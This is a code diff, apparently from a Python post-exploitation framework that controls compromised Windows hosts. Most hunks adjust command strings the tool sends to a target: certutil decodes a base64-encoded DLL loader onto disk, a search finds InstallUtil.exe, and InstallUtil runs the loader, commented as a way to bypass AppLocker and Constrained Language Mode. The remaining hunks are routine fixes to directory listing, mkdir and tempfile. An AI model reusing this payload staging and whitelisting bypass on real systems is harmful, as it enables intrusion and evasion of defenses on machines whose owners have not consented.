@@ -536,7 +536,7 @@ function prompt {
 
         # Decode the base64 to the actual dll
         self.channel.send(
-            f"""certutil -decode "{str(loader_remote_path)}" "{good_dir}\{loader_encoded_name}.dll"\n""".encode(
+            f"""certutil -decode "{str(loader_remote_path)}" "{good_dir}\\{loader_encoded_name}.dll"\n""".encode(
                 "utf-8"
             )
         )
@@ -549,7 +549,7 @@ function prompt {
 
         # Search for all instances of InstallUtil within all installed .Net versions
         self.channel.send(
-            """cmd /c "dir \Windows\Microsoft.NET\* /s/b | findstr InstallUtil.exe$"\n""".encode(
+            """cmd /c "dir \\Windows\\Microsoft.NET\\* /s/b | findstr InstallUtil.exe$"\n""".encode(
                 "utf-8"
             )
         )
@@ -570,7 +570,7 @@ function prompt {
 
         # Execute Install-Util to bypass AppLocker/CLM
         self.channel.send(
-            f"""{install_utils} /logfile= /LogToConsole=false /U "{good_dir}\{loader_encoded_name}.dll"\n""".encode(
+            f"""{install_utils} /logfile= /LogToConsole=false /U "{good_dir}\\{loader_encoded_name}.dll"\n""".encode(
                 "utf-8"
             )
         )
@@ -978,6 +978,15 @@ function prompt {
 
         try:
             result = self.powershell(f'Get-ChildItem -Force -Path "{path}" | Select ')
+
+            # Check if there were no entries
+            if not result:
+                return []
+
+            # Check if there was one entry
+            if isinstance(result[0], dict):
+                return [result[0]["Name"]]
+
             return [r["Name"] for r in (result[0] if len(result) else [])]
         except PowershellError as exc:
             if "not exist" in str(exc):
@@ -992,12 +1001,15 @@ function prompt {
 
         raise PlatformError("lstat not implemented for Windows")
 
-    def mkdir(self, path: str):
+    def mkdir(self, path: str, mode: int = 0o777, parents: bool = True):
         """Create a new directory. This is implemented with the New-Item
         commandlet.
 
         :param path: path to the new directory
         :type path: str
+        :param mode: permissions for the directory (ignored for windows)
+        :type mode: int
+        :param parents: whether to create all items (defaults to True for windows)
         """
 
         self.new_item(ItemType="Directory", Path=path)
@@ -1103,7 +1115,7 @@ function prompt {
         return result
 
     def tempfile(
-        self, mode: str, length: Optional[int] = None, suffix: Optional[str] = None
+        self, mode: str, length: Optional[int] = 8, suffix: Optional[str] = None
     ):
         """ Create a temporary file in a safe directory. Optionally provide a suffix """
 
